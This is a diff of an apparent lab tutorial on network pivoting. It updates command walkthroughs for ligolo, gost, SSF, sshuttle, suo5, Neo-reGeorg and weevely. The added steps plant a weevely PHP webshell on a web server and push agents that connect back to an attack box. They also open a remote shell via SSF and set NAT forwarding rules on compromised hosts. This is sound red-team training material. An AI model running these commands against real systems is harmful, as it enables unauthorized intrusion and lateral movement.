@@ -49,15 +49,15 @@ cat /tmp/PROOF
 | iptables    | true              | true          | linux             | false | false | Bent pipe or NAT |
 | socat       | rarely            | false*        | linux/windows     | false | true* | so many permutations |
 | ligolo      | false             | false         | linux/windows     | true  | true  | Latest hotness |
-| gost        | false             | false         | linux/windows     | true  | true  | Huge amount of capabilities |
+| gost        | false             | false*        | linux/windows     | true  | true  | Huge amount of capabilities |
 | Chisel      | false             | false         | linux/windows     | true  | false | Web-based but not a webshell |
 | SSF         | false             | false         | linux/windows     | true  | false | like a small implant |
 | sshuttle    | true              | false         | linux             | false | false | Simple yet complicated |
 | suo5        | false             | false         | php,jsp,aspx,jspx | true  | false | Python client, Chinese webshell |
 | Neo-reGeorg | false             | false         | php,aspx          | true  | false | Python client, Chinese webshell, but older |
-| pivotnacci  | false             | false         | php,jsp,aspx      | true  | false | Python client, webshell|
+| weevely3    | false             | false         | php               | false | false | webshell, only http proxying but tons of post-exploitation functionality|
 
-* These tools are capable of creating a tun interface that would require root privileges, but this is not required for their effective use as pivoting tools.
+* These tools can do pivoting without root privileges, but can be used with greater effectiveness with root privileges or the ability to make iptables rules and allow ip forwarding.
 ```
 
 The goal is provide basic functionality of each tool, although there are certainly many more advanced features that will be left to the reader to explore.  Iptables will be an exception -- we will demonstrate simple port forwarding, and then use the nat table for more advanced pivoting as a part of other tools.  If you are unfamiliar with these tools, I suggest doing at least ssh, iptables, and socat, and then jumping around to whatever seems interesting.
@@ -388,7 +388,7 @@ interface_create --name ligolo
 cd tools/ligolo-ng
 scp agent root@lamp:
 ssh root@lamp 'chmod +x agent'
-ssh root@lamp './agent -connect <ATTACK_BOX_IP>:11601 -accept-fingerprint <FINGERPRINT_FROM_THE_SERVER>
+ssh root@lamp './agent -connect <ATTACK_BOX_IP>:11601 -accept-fingerprint <FINGERPRINT_FROM_THE_SERVER>'
 ```
 
 ### Tun interface
@@ -408,7 +408,7 @@ start
 Notice in this iteration we use a udp listener instead of tcp.  Originally I tried a tcp listener, but my callback connection would timeout.  I am not sure why, but I only saw this with ligolo.
 
 ```
-[[ Ligolo~Callme ]]
+[[ Ligolo~Callme ]]*
 lsof -i udp:4444
 	socat -u udp-listen:4444,reuseaddr,fork open:/tmp/PROOF,create,append &
 cat /tmp/PROOF
@@ -438,13 +438,13 @@ listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
 #### Push and execute binary
 
 ```
-[[ Ligolo~SecondAgent ]]
+[[ Ligolo~SecondAgent ]]*
 cd tools/ligolo-ng
 	#Let us double-check that we are trying to access nginx using our ligolo interface
 ip route get 10.X.20.221
 scp agent root@nginx:
 ssh root@nginx 'chmod +x agent'
-ssh root@nginx './agent -connect lamp:11601 -accept-fingerprint <FINGERPRINT_FROM_THE_SERVER>
+ssh root@nginx './agent -connect lamp:11601 -accept-fingerprint <FINGERPRINT_FROM_THE_SERVER>'
 ```
 
 #### Use the second agent
@@ -455,7 +455,7 @@ ssh root@nginx './agent -connect lamp:11601 -accept-fingerprint <FINGERPRINT_FRO
 stop
 	#Next we move to our new session
 session
-2
+    #Pick the new session
 	#And restart the tunnel
 start
 ```
@@ -544,6 +544,13 @@ cat /tmp/PROOF
 
 Now that we have our tun interface, we have to set up our iptables and routing as we did for the ssh tun interface.
 
+```
+ssh root@tom 'sysctl -w net.ipv4.ip_forward=1'
+ssh root@tom 'iptables -t nat -I POSTROUTING -s 192.168.123.0/24 ! -o tun0 -j MASQUERADE'
+ssh root@tom "iptables -I FORWARD --src 192.168.123.2 -j ACCEPT"
+```
+
+
 #### Clean up
 
 ```
@@ -551,6 +558,7 @@ Now that we have our tun interface, we have to set up our iptables and routing a
 sudo pkill gost
 ssh root@tom 'pkill gost'
 ssh root@tom 'iptables -t nat -D POSTROUTING -s 192.168.123.0/24 ! -o tun0 -j MASQUERADE'
+ssh root@tom "iptables -D FORWARD --src 192.168.123.2 -j ACCEPT"
 ```
 
 ### kcp socks
@@ -685,10 +693,15 @@ cd tools/ssf/ssf-linux-x86_64-3.0.0
 
 ```
 [[ SSF~Prep ]]
-openssl req -newkey rsa:4096 -nodes -keyout private.key -out certificate.csr
+openssl req -newkey rsa:4096 -nodes -keyout private.key -out certificate.csr -subj '/C=IN/ST=State/L=Local/O=Company/OU=IT/CN=foo.bar'
+
+
 openssl rsa -in private.key -out private.key -aes256 -passout pass:passphrase
-openssl dhparam  -outform PEM -out dh4096.pem
-openssl req -x509 -nodes -newkey rsa:4096 -keyout ca.key -out ca.crt -days 3650
+
+openssl dhparam -dsaparam -out dh4096.pem 4096 #[] add this line
+
+openssl req -x509 -nodes -newkey rsa:4096 -keyout ca.key -out ca.crt -days 3650 -subj '/C=IN/ST=State/L=Local/O=Company/OU=IT/CN=foo.bar'
+
 
 cat << EOF > extfile.txt
 [ v3_req_p ]
@@ -700,7 +713,8 @@ basicConstraints = CA:TRUE
 keyUsage = nonRepudiation, digitalSignature, keyEncipherment, keyCertSign
 EOF
 
-openssl req -newkey rsa:4096 -nodes -keyout ca_int.key -out ca_int.csr
+openssl req -newkey rsa:4096 -nodes -keyout ca_int.key -out ca_int.csr -subj '/C=IN/ST=State/L=Local/O=Company/OU=IT/CN=foo.bar'
+
 openssl x509 -extfile extfile.txt -extensions v3_ca_p -req -sha1 -days 3650 -CA ca.crt -CAkey ca.key -CAcreateserial -in ca_int.csr -out ca_int.crt
 cat ca.crt >> ca_int.crt
 
@@ -725,11 +739,43 @@ sed -i "s:./certs/dh4096.pem:$DH:" config.json
 #### push files and execute
 
 ```
-[[ SSF~Action ]]*
-scp ssfd config.json root@10.X.20.220:
-ssh root@10.X.20.220 ./ssfd &
-./ssf 10.X.20.220 -X 4444 &
-nc 127.0.0.1 4444
+[[ SSF~Server ]]*
+cd tools/ssf/ssf-linux-x86_64-3.0.0
+scp ssfd config.json root@lamp:
+ssh root@lamp ./ssfd --gateway-ports
+```
+
+```
+[[ SSF~Client ]]*
+cd tools/ssf/ssf-linux-x86_64-3.0.0
+./ssf lamp --socks 9050 --remote-tcp-forward 0.0.0.0:4444:127.0.0.1:4444 --shell 5555 
+    #This command is doing a lot -- we created a socks proxy through lamp on 9050, we opened up port 4444 on lamp to forward to localhost 4444, and opened up 5555 locally for a shell on lamp
+```
+
+```
+[[ SSF~CallMe ]]*
+lsof -i tcp:9050
+lsof -i tcp:4444
+    #If this fails, then we need to start up our listener again
+    socat -u tcp-listen:4444,fork open:/tmp/PROOF,create,append &
+
+ssh root@lamp ss -punta
+cat /tmp/PROOF
+proxychains4 -q callMe.sh linux 80 10.2.20.220 4444 tcp
+cat /tmp/PROOF
+
+    #Lets also grab a shell from this server
+lsof -i tcp:5555
+nc 127.0.0.1 5555
+```
+
+
+#### clean up
+
+```
+[[ SSF~CallMe ]]
+pkill ssf
+ssh root@lamp pkill ssfd
 ```
 
 ## sshuttle
@@ -738,8 +784,9 @@ While I think sshuttle is a cool tool, I do not understand all the networking go
 
 ```
 [[ sshuttle~connect ]]*
-sudo sshuttle --remote root@lamp 10.X.22.0/24  --daemon
+sudo sshuttle --remote root@tom 10.X.22.0/24  --daemon
 	#The third octet for the target machines is 22, so this will only tunnel traffic meant for the target through the sshuttle tunnel.
+	#Also note that we are using root, but you do not need root access for this to work
 yes
 
 	#Notice sshuttle changes our iptables rules.  I do not enjoy this.
@@ -755,7 +802,7 @@ cat /tmp/PROOF
 ### clean up sshuttle
 
 ```
-[[ sshuttle~Kali ]]
+[[ sshuttle~connect ]]
 sudo pkill sshuttle
 sudo iptables -t nat -nvL
 ```
@@ -770,6 +817,24 @@ chmod +x suo5-linux-amd64
 ./suo5-linux-amd64 -t http://tom:8080/suo5.jsp
 ```
 
+```
+[[ SUO5~CallMe ]]*
+sudo sed -i '/^socks/Ic\socks5 127.0.0.1 1111' /etc/proxychains4.conf
+tail /etc/proxychains4.conf
+	#make sure it says socks5 127.0.0.1 9050
+
+lsof -i tcp:4444
+	socat -u tcp-listen:4444,reuseaddr,fork open:/tmp/PROOF,create,append &
+
+cat /tmp/PROOF
+proxychains -q callMe.sh linux 80 <ATTACK_BOX_IP> 4444 tcp
+cat /tmp/PROOF
+	#Notice we got a callback through our socks proxy
+```
+
+
+
+
 ## Neo-reGeorg
 
 ```
@@ -781,14 +846,57 @@ cat neoreg_servers/tunnel.php | ssh -o StrictHostKeyChecking=no root@lamp 'cat -
 ./neoreg.py -k password -u http://lamp/tunnel.php --php -vvv
 ```
 
-### Pivotnacci
+```
+[[ NeoreGeorg~CallMe ]]*
+sudo sed -i '/^socks/Ic\socks5 127.0.0.1 1080' /etc/proxychains4.conf
+tail /etc/proxychains4.conf
+	#make sure it says socks5 127.0.0.1 1080
+
+lsof -i tcp:4444
+	socat -u tcp-listen:4444,reuseaddr,fork open:/tmp/PROOF,create,append &
+
+cat /tmp/PROOF
+proxychains -q callMe.sh linux 80 <ATTACK_BOX_IP> 4444 tcp
+cat /tmp/PROOF
+	#Notice we got a callback through our socks proxy
+```
+
+
+## Weevely
 
 ```
-[[ Pivotnacci~Demo ]]*
-cd tools/pivotnacci
-cat agents/agent.php | ssh -o StrictHostKeyChecking=no root@lamp 'cat - |sudo tee /var/www/html/tunnel.php'
-./pivotnacci http://lamp/tunnel.php --verbose
+[[ Weevely~Demo ]]*
+cd tools/weevely
+./weevely.py generate password ./weevely.php
+cat weevely.php | ssh root@lamp 'cat - |sudo tee /var/www/html/weevely.php'
+./weevely.py http://lamp/weevely.php password
+    #You are now dropped into a pretty cool shell.  Lots of functionality here, but we will only focus on the web proxying
+:net_proxy
 ```
+
+```
+[[ Weevely~CallMe ]]
+lsof -i tcp:4444
+	socat -u tcp-listen:4444,fork open:/tmp/PROOF,create,append &
+cat /tmp/PROOF
+
+
+lsof -i tcp:8080
+    #Lets make sure our http proxy is working correctly
+
+cat /tmp/PROOF
+curl  -x http://127.0.0.1:8080 "http://linux:80/send-packet"  -H 'Content-Type: application/json' --data-raw '{"ip":"'kali'","port":"'4444'","protocol":"'tcp'"}'
+    #I tried fixing this up with proxychains and callMe.sh, but I got some errors.  This is sufficient to demonstrate we can proxy through with Weevely.
+cat /tmp/PROOF
+```
+
+### Clean up
+
+```
+pkill weevely.py
+lsof -i tcp:8080
+```
+
 
 ### Exploitation
 
@@ -826,3 +934,4 @@ root:PivotLab1!
 - https://latest.gost.run/en/
 - https://gost.run/en/tutorials/
 - https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/
+- https://gitbook.seguranca-informatica.pt/cheat-sheet-1/stuff/pivoting
